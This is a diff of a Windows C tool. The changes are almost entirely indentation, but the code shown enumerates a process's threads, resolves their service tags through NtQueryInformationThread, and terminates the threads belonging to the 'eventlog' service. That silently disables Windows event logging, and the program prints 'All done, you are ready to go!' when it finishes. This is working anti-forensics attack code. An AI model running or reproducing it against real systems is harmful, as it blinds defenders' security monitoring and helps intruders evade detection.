@@ -142,18 +142,18 @@ BOOL GetServiceTagName(DWORD tid)
     HANDLE hThread = OpenThread(THREAD_ALL_ACCESS,FALSE, tid);
     if (NULL == hThread)
     {
-      printf("OpenThread : %u Error! ErrorCode:%u\n",tid,GetLastError());
+      	printf("OpenThread : %u Error! ErrorCode:%u\n",tid,GetLastError());
         return 0;
-	  }
-	  FN_NtQueryInformationThread fn_NtQueryInformationThread = NULL;
-	  HINSTANCE hNTDLL = GetModuleHandle(_T("ntdll"));  
-	  fn_NtQueryInformationThread = (FN_NtQueryInformationThread)GetProcAddress(hNTDLL, "NtQueryInformationThread");
-	  THREAD_BASIC_INFORMATION threadBasicInfo;
-	  LONG status = fn_NtQueryInformationThread(hThread, ThreadBasicInformation, &threadBasicInfo,sizeof(threadBasicInfo), NULL);
+    }
+    FN_NtQueryInformationThread fn_NtQueryInformationThread = NULL;
+    HINSTANCE hNTDLL = GetModuleHandle(_T("ntdll"));  
+    fn_NtQueryInformationThread = (FN_NtQueryInformationThread)GetProcAddress(hNTDLL, "NtQueryInformationThread");
+    THREAD_BASIC_INFORMATION threadBasicInfo;
+    LONG status = fn_NtQueryInformationThread(hThread, ThreadBasicInformation, &threadBasicInfo,sizeof(threadBasicInfo), NULL);
 //	printf("process ID is %u\n",threadBasicInfo.clientId.uniqueProcess); 
 //	printf("Thread ID is %u\n",threadBasicInfo.clientId.uniqueThread); 
-	  CloseHandle ( hThread ) ;
-	  DWORD pid = threadBasicInfo.clientId.uniqueProcess;
+    CloseHandle ( hThread ) ;
+    DWORD pid = threadBasicInfo.clientId.uniqueProcess;
     printf("[+] Query Service Tag %u.%u\n",pid,tid);
     ULONG serviceTag = 0;
     if (GetServiceTag(pid, tid, &serviceTag) == FALSE)
@@ -166,11 +166,11 @@ BOOL GetServiceTagName(DWORD tid)
         return 0;
     }
 //    wprintf(L"Service Tag Name : %s\n", tagString);
-	  if(wcscmp(tagString,L"eventlog")==0)
-	  {
-		printf("[!] Get eventlog thread,%d!	--> try to kill ",tid);
-		TerminateEventlogThread(tid);
-	  }
+    if(wcscmp(tagString,L"eventlog")==0)
+    {
+        printf("[!] Get eventlog thread,%d!	--> try to kill ",tid);
+        TerminateEventlogThread(tid);
+    }
 }
 
 BOOL ListProcessThreads(DWORD pid) 
@@ -182,18 +182,18 @@ BOOL ListProcessThreads(DWORD pid)
         return(FALSE);   
     te32.dwSize = sizeof(THREADENTRY32);  
     if (!Thread32First(hThreadSnap, &te32)) 
-	  { 
-		  printf("Thread32First");
-      CloseHandle(hThreadSnap);   
-      return(FALSE);  
+    { 
+        printf("Thread32First");
+        CloseHandle(hThreadSnap);   
+        return(FALSE);  
     }  
     do 
-	  {  
+    {  
         if (te32.th32OwnerProcessID == pid)
-		    {
+	{
 //            printf("tid= %d\n",te32.th32ThreadID);  
-			    GetServiceTagName(te32.th32ThreadID);
-		    }
+		GetServiceTagName(te32.th32ThreadID);
+	}
     } while (Thread32Next(hThreadSnap, &te32));  
     CloseHandle(hThreadSnap);  
     return(TRUE);  
@@ -201,9 +201,9 @@ BOOL ListProcessThreads(DWORD pid)
   
 int _tmain(int argc, _TCHAR* argv[])
 {
-	  SetPrivilege();
-	  ListProcessThreads(_ttoi(argv[1]));
-	  printf("------------------------------\n");
-	  printf("All done, you are ready to go!\n");	 
+    SetPrivilege();
+    ListProcessThreads(_ttoi(argv[1]));
+    printf("------------------------------\n");
+    printf("All done, you are ready to go!\n");	 
     return 0;
 }
